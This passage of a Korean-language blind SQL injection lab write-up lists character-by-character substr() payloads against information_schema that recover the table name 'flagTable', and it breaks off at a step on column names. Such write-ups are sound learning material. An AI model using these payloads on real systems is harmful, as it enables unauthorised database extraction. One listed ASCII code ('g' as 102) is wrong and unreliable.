...
```
limit 0,1을 넣은 이유는 테이블이 여러 개일 수 있기 때문에 LIMIT을 써서 하나씩 선택적으로 접근하기 위해 넣은것이다.

substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 1, 1) = 'f' Ascii 로 102
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 2, 1) = 'l' Ascii 로 108
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 3, 1) = 'a' Ascii 로 97
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 4, 1) = 'g' Ascii 로 102
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 5, 1) = 'T' Ascii 로 84
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 6, 1) = 'a' Ascii 로 97
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 7, 1) = 'b' Ascii 로 98
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 8, 1) = 'l' Ascii 로 108
substr((select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1), 9, 1) = 'e' Ascii 로 101

Table 이름은 'flagTable'로 확정되었다.

### Step 6. column 이름 알아내기
...
```
최종적으로 `substr()` 조건을 1글자씩 대입하면서 전체 문자열을 추출했다.  
결과는 `flagTable`의 첫 번째 row에서 추출한 값이며, 아래와 같은 방식으로 접근했다:
